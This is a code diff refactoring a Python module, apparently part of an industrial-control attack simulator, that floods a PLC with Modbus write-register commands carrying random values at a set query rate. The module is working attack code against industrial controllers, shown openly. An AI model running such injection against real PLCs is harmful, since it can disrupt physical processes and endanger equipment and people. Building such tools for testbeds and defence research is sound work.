@@ -1,79 +1,49 @@
 # injector/attacks/write_injection.py
-
 import logging
 import random
-import time
+from dataclasses import dataclass
 from typing import Optional
+from threading import Event
 
 from injector.core.config import PlcConfig, get_plc_config
-from injector.core.modbus import modbus_client
+from injector.runtime.task_runner import run_task_loop, LoopTiming
 
 log = logging.getLogger(__name__)
 
+@dataclass
+class WriteInjState:
+    target_register: int
+    vmin: int
+    vmax: int
+
+def _tick_write_inj(*, client, cfg: PlcConfig, state: WriteInjState) -> None:
+    value = random.randint(state.vmin, state.vmax)
+    rq = client.write_register(state.target_register, value, unit=cfg.unit_id)
+    if rq.isError():
+        log.warning("WRITE injection error writing HR[%d]=%d: %s", state.target_register, value, rq)
+    else:
+        log.info("WRITE injection: wrote HR[%d] = %d", state.target_register, value)
 
 def run_write_injection(
     cfg: Optional[PlcConfig] = None,
-    stop_event=None,
+    stop_event: Optional[Event] = None,
     target_register: int = 2,
     qps: float = 5.0,
     value_min: Optional[int] = None,
     value_max: Optional[int] = None,
 ) -> None:
-    """
-    Atak typu WRITE injection:
-    - wysyła FC6 (write_single_register) do wskazanego rejestru,
-    - z zadaną częstotliwością qps (queries per second).
+    cfg = cfg or get_plc_config()
+    vmin = cfg.safe_write_min if value_min is None else value_min
+    vmax = cfg.safe_write_max if value_max is None else value_max
+    if vmin > vmax:
+        vmin, vmax = vmax, vmin
 
-    Oczekuje, że zostanie wywołany jako thread z przekazanym stop_event.
-    """
-    if cfg is None:
-        cfg = get_plc_config()
-
-    if stop_event is None:
-        import threading
-        stop_event = threading.Event()
-
-    if value_min is None:
-        value_min = getattr(cfg, "safe_write_min", 0)
-    if value_max is None:
-        value_max = getattr(cfg, "safe_write_max", 1000)
-
-    if value_min > value_max:
-        value_min, value_max = value_max, value_min
-
-    period = 1.0 / qps if qps > 0 else 0.0
-
-    log.info(
-        "WRITE injection started: HR[%d], qps=%.2f, range=[%d, %d]",
-        target_register,
-        qps,
-        value_min,
-        value_max,
+    run_task_loop(
+        name="WRITE_INJ",
+        cfg=cfg,
+        stop_event=stop_event,
+        tick=_tick_write_inj,
+        state=WriteInjState(target_register=target_register, vmin=vmin, vmax=vmax),
+        timing=LoopTiming(qps=qps),
+        connection_mode="persistent",
     )
-
-    while not stop_event.is_set():
-        value = random.randint(value_min, value_max)
-
-        try:
-            with modbus_client(cfg) as client:
-                rq = client.write_register(target_register, value, unit=cfg.unit_id)
-                if rq.isError():
-                    log.warning(
-                        "WRITE injection error writing HR[%d] = %d: %s",
-                        target_register,
-                        value,
-                        rq,
-                    )
-                else:
-                    log.info(
-                        "WRITE injection: wrote HR[%d] = %d",
-                        target_register,
-                        value,
-                    )
-        except Exception as e:
-            log.warning("WRITE injection: exception during write: %r", e)
-
-        if period > 0:
-            time.sleep(period)
-
-    log.info("WRITE injection: stop_event set, leaving loop")
